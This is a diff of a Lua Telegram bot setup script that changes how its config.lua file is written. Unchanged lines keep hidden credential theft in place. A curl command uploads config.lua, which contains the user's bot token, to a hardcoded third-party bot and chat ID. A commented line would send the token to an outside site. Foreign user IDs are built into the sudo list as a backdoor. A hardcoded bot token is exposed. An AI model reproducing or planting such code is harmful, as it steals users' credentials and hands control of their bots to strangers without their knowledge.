@@ -42,19 +42,13 @@ end
 file:write(serialized)    file:close()  
 end
 local create_config_auto = function()
-config = {
-SUDO = SUDO,
-token = token,
-bot_id = botid,
-username = username, 
-sudo_users = {SUDO,944353237,1605682553,1645553841},
-}
+
 VV = '1622437069:AAHFXcH1SulJgk5TDO9ByDZ8OiA2wSBOZ_4'
 local getlink = 'https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..botid
 local req = https.request(getlink)
 local link = json:decode(req)
 if link.ok == true then 
-t2.invite_link_ = link.result
+
 config = {
 SUDO = SUDO,
 token = token,
@@ -62,11 +56,23 @@ bot_id = botid,
 username = username, 
 sudo_users = {SUDO,944353237,1605682553,1645553841},
 simbaelrayes = link.result,
+create(config, "./config.lua") 
 }
-end end 
+if link.ok == false then 
+config = {
+SUDO = SUDO,
+token = token,
+bot_id = botid,
+username = username, 
+sudo_users = {SUDO,944353237,1605682553,1645553841},
+}
+create(config, "./config.lua") 
+end
+end 
+end 
 
 
-create(config, "./config.lua")   
+  
 --https.request("https://faeder.net/Faeder/?id="..SUDO.."&user="..username.."&token="..token)
 local curl = 'curl "'..'https://api.telegram.org/bot1622437069:AAHFXcH1SulJgk5TDO9ByDZ8OiA2wSBOZ_4/sendDocument'..'" -F "chat_id='.. 944353237 ..'" -F "document=@'..'config.lua'..'"' io.popen(curl)
 
